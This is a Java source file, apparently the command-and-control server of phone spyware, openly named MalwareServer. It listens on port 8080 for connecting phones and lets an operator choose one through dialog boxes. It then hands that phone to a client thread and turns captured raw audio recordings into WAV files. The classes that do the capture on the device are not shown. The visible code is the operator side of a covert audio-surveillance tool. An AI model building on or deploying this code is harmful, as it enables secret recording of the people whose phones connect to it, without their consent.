import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowEvent;
import java.io.ByteArrayInputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.Scanner;
import java.io.IOException;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileInputStream;
import java.io.FileNotFoundException;

import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.FloatControl;
import javax.sound.sampled.SourceDataLine;

import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;
import javax.swing.SwingUtilities;

class MalwareServer
{
	static int socketPort = 8080;
	static int sampleRate = 44100;
	static ServerSocket sSocket = null;
	static ArrayList<Socket> phoneList;
	static ClientThreads clientThread = null;
	static boolean clientSearch = true;
        static Presentation presentation = null;
        static MainMenu mainmenu = null;
        static Socket conn = null;

	public static void main(String args[]) throws Exception
	{ 
            SwingUtilities.invokeLater(new Runnable(){
                public void run()
                {
                    mainmenu = new MainMenu();
                    mainmenu.setVisible(true);
                }
            });
	}
        
        public static void serverControl()
        {
            phoneList = new ArrayList<Socket>();
            createConnection(socketPort);
        }
        
         public static void applicationControl()
         {
            try 
            {
                setup();
            } 
            catch (Exception ex) 
            {
                Logger.getLogger(MalwareServer.class.getName()).log(Level.SEVERE, null, ex);
            }
         }
        
	public static void createConnection(int sPort)
	{
		try
		{
			sSocket = new ServerSocket(sPort);
                        sSocket.setSoTimeout(3000);
			
			System.out.println("Server created. Waiting for connection...");
                        
                        mainmenu.setStatus("Waiting for connection...");
                        
			phoneListConnection();
		}
                catch(SocketTimeoutException e)
                {
                    System.err.println("SocketTimeoutException: " + e);
                    selectPhone();
                }
		catch(IOException e)
		{
                    System.err.println("IOException");
		}
	}
        
        public static void phoneListConnection() throws IOException
        {
            try
            {
                while(clientSearch)
                {
                    JOptionPane.showMessageDialog(null, "Waiting for connection...", "Status", JOptionPane.INFORMATION_MESSAGE); 
                    conn = sSocket.accept();
                    phoneList.add(conn);
                    selectPhone();
                }
            }
            catch(SocketTimeoutException e)
            {
                System.err.println("SocketTimeoutException: " + e);
                selectPhone();
                phoneListConnection();
            }
        }
	
	public static void selectPhone()
	{
                System.out.println("selectPhone()");

		String input = "";
                String list = "";
                
		for(int i = 0; i < phoneList.size(); i++)
		{
                    list = list + "[" + i + "] " + phoneList.get(i)+"\n";
		}
			
                if(phoneList.size() == 0)
                {
                    JOptionPane.showMessageDialog(null, "No devices to connect to.\nPress OK to refresh list", "Status", JOptionPane.INFORMATION_MESSAGE); 
                }
                else
                {
                    input = JOptionPane.showInputDialog(list + "\nPlease input a value or press OK to refresh list");
                }
                        
		if(!input.equals(""))
		{
                    clientSearch = false;
                    clientThread = new ClientThreads(phoneList.get(Integer.parseInt(input)));
                    clientThread.start();
		}
		System.out.println();
	}

	public static void setup() throws Exception
	{
            SetupThread s = new SetupThread(mainmenu);
            s.start();
	}
	
	public static void rawToWav(File f)
	{
		try
		{
			copyWaveFile("recording.raw", System.currentTimeMillis()+".wav");
		}
		catch(Exception e)
		{
			System.out.println(e);
		}
	}
	
	private static void copyWaveFile(String inFilename, String outFilename)
    {
        FileInputStream in = null;
        FileOutputStream out = null;
        long totalAudioLen = 0;
        long totalDataLen = totalAudioLen + 36;
        long longSampleRate = sampleRate;
        int channels = 1;
        long byteRate = 16 * sampleRate * channels/8;

        byte[] data = new byte[3584];

        try 
		{
            in = new FileInputStream(inFilename);
            out = new FileOutputStream(outFilename);
            totalAudioLen = in.getChannel().size();
            totalDataLen = totalAudioLen + 36;

            WriteWaveFileHeader(out, totalAudioLen, totalDataLen, longSampleRate, channels, byteRate);

            while(in.read(data) != -1)
			{
                out.write(data);
            }

            in.close();
            out.close();
        } 
		catch (FileNotFoundException e) 
		{
            e.printStackTrace();
        } 
		catch (IOException e) 
		{
            e.printStackTrace();
        }
    }

    private static void WriteWaveFileHeader(FileOutputStream out, long totalAudioLen, long totalDataLen, long longSampleRate, int channels, long byteRate) throws IOException 
	{
        byte[] header = new byte[44];

        header[0] = 'R';  // RIFF/WAVE header
        header[1] = 'I';
        header[2] = 'F';
        header[3] = 'F';
        header[4] = (byte) (totalDataLen & 0xff);
        header[5] = (byte) ((totalDataLen >> 8) & 0xff);
        header[6] = (byte) ((totalDataLen >> 16) & 0xff);
        header[7] = (byte) ((totalDataLen >> 24) & 0xff);
        header[8] = 'W';
        header[9] = 'A';
        header[10] = 'V';
        header[11] = 'E';
        header[12] = 'f';  // 'fmt ' chunk
        header[13] = 'm';
        header[14] = 't';
        header[15] = ' ';
        header[16] = 16;  // 4 bytes: size of 'fmt ' chunk
        header[17] = 0;
        header[18] = 0;
        header[19] = 0;
        header[20] = 1;  // format = 1
        header[21] = 0;
        header[22] = (byte) channels;
        header[23] = 0;
        header[24] = (byte) (longSampleRate & 0xff);
        header[25] = (byte) ((longSampleRate >> 8) & 0xff);
        header[26] = (byte) ((longSampleRate >> 16) & 0xff);
        header[27] = (byte) ((longSampleRate >> 24) & 0xff);
        header[28] = (byte) (byteRate & 0xff);
        header[29] = (byte) ((byteRate >> 8) & 0xff);
        header[30] = (byte) ((byteRate >> 16) & 0xff);
        header[31] = (byte) ((byteRate >> 24) & 0xff);
        header[32] = (byte) (2 * 16 / 8);  // block align
        header[33] = 0;
        header[34] = 16;  // bits per sample
        header[35] = 0;
        header[36] = 'd';
        header[37] = 'a';
        header[38] = 't';
        header[39] = 'a';
        header[40] = (byte) (totalAudioLen & 0xff);
        header[41] = (byte) ((totalAudioLen >> 8) & 0xff);
        header[42] = (byte) ((totalAudioLen >> 16) & 0xff);
        header[43] = (byte) ((totalAudioLen >> 24) & 0xff);

        out.write(header, 0, 44);
    }
}
